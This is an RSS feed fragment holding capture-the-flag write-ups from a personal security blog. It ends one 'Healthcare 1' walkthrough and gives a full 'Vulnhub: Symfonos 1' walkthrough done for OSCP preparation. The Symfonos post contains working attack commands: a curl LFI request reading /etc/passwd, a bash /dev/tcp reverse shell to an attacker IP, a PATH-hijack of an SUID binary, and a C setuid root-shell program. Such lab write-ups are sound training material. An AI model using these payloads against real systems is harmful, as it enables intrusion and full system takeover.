+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-19.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Reverse shell obtained.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-20.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h4 id=&#34;edit-existing-php-files&#34;&gt;Edit existing php files&lt;/h4&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Using the same files functionality, we can also perform edits to existing files. In this case we can edit config.php
+and add our reverse shell payload. After saving it and refreshing the page, a reverse shell is obtained on netcat
+listener.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-24.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Another possible path that would have been taken after initial shell was that, the shadow file in the
+/var/backups directory was world readable.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-21.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Therefore we can crack this hash and switch user to almirant.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-22.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Then we get user.txt.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-23.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
+    </item>
+    
+    <item>
+      <title>Vulnhub: Symfonos 1</title>
+      <link>https://blog.ikuamike.io/posts/2021/symfonos1/</link>
+      <pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.ikuamike.io/posts/2021/symfonos1/</guid>
+      <description></description>
+      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Difficulty&lt;/th&gt;
+&lt;th&gt;Release Date&lt;/th&gt;
+&lt;th&gt;Author&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Beginner&lt;/td&gt;
+&lt;td&gt;29 June 2019&lt;/td&gt;
+&lt;td&gt;Zayotic&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
+&lt;p&gt;I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null&amp;rsquo;s OSCP
+Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.&lt;/p&gt;
+&lt;p&gt;In this box, initial access is through lfi to rce by using sending a payload in mail and accessing it.For privilege
+escalation we exploit a setuid binary that doesn&amp;rsquo;t use absolute paths, therefore hijacking the path gives us root.&lt;/p&gt;
+&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
+&lt;p&gt;I already have the IP of the box.&lt;/p&gt;
+&lt;p&gt;Nmap output:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Nmap scan report for 192.168.191.128
+Host is up (0.00025s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
+|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
+|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
+25/tcp  open  smtp        Postfix smtpd
+|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
+| ssl-cert: Subject: commonName=symfonos
+| Subject Alternative Name: DNS:symfonos
+| Not valid before: 2019-06-29T00:29:42
+|_Not valid after:  2029-06-26T00:29:42
+|_ssl-date: TLS randomness does not represent time
+80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn&#39;t have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
+|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.5.16-Debian)
+|   Computer name: symfonos
+|   NetBIOS computer name: SYMFONOS\x00
+|   Domain name: \x00
+|   FQDN: symfonos
+|_  System time: 2021-01-21T13:48:08-06:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-01-21T19:48:08
+|_  start_date: N/A
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;h2 id=&#34;samba-139445&#34;&gt;Samba (139/445)&lt;/h2&gt;
+&lt;p&gt;Using enum4linux-ng we get 2 pieces of useful information.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;enum4linux-ng.py -A 192.168.191.128:
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A user &lt;strong&gt;helios&lt;/strong&gt; is discovered&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos2.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;and the &lt;strong&gt;anonymous&lt;/strong&gt; share is accessible without credentials.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos3.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Using smbclient to access the share, there is a txt file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbclient &lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;192.168.191.128&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;anonymous -N
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos4.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Looking at the contents of attention.txt:&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos5.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Now we have a username and possible passwords. The combination &lt;strong&gt;helios:qwerty&lt;/strong&gt; works and we can access
+the helios share.&lt;/p&gt;
+&lt;p&gt;We get access to more txt files, but only the todo.txt has valuable information.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos6.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;It gives an endpoint,that we can access on the webserver.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos7.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
+&lt;p&gt;When we access the endpoint we end up on a wordpress instance.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos8.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;redacted&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
+&lt;li&gt;mail-masta 1.0:&lt;/li&gt;
+&lt;/ol&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos9.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;site-editor 1.1.1&lt;/li&gt;
+&lt;/ol&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos10.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Using the PoC available on exploitdb: &lt;a href=&#34;https://www.exploit-db.com/exploits/40290/&#34;&gt;https://www.exploit-db.com/exploits/40290/&lt;/a&gt; , we can craft this url
+to read files such as /etc/passwd:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos11.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;getting-shell-as-helios---lfi-to-rce&#34;&gt;Getting shell as helios - LFI to RCE&lt;/h1&gt;
+&lt;p&gt;A typical method to escalate to RCE using LFI is poisoning log files but I wasn&amp;rsquo;t able to load any log
+file to use this method.
+With the presence of port 25 we can try sending an email and try accessing the email using LFI.&lt;/p&gt;
+&lt;p&gt;Sending email with payload:&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos12.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=whoami
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos13.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Now we can get a reverse shell using this payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;/bin/bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -i &amp;gt;%26 /dev/tcp/192.168.191.1/9000 0&amp;gt;%261 %26&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;Usual enumeration for privilege escalation involves looking for suid binaries by using find.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;find / -perm -4000 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary statuscheck isn&amp;rsquo;t among the linux default ones.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos14.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After running it and then running strings against it, it calls the curl command when executed.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos15.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Since it doesn&amp;rsquo;t use the absolute path we can abuse this by setting our own PATH and make it call our own custom
+curl command.&lt;/p&gt;
+&lt;p&gt;In my custom curl script I get a copy of bash and give it suid permissions:&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos16.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h3 id=&#34;rooted&#34;&gt;Rooted&lt;/h3&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos17.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
+&lt;p&gt;Better way to handle the sending email part using sendEmail:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test Subject&amp;#34;&lt;/span&gt; -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test Message&amp;#34;&lt;/span&gt; -o tls&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Better suid exploit, compiling a c program that correctly sets the uid and gid as root.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
+    setgid(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); 
+    setuid(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+    execl(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos18.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
+&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;
+
+&lt;/p&gt;
+&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;
+
+&lt;/p&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
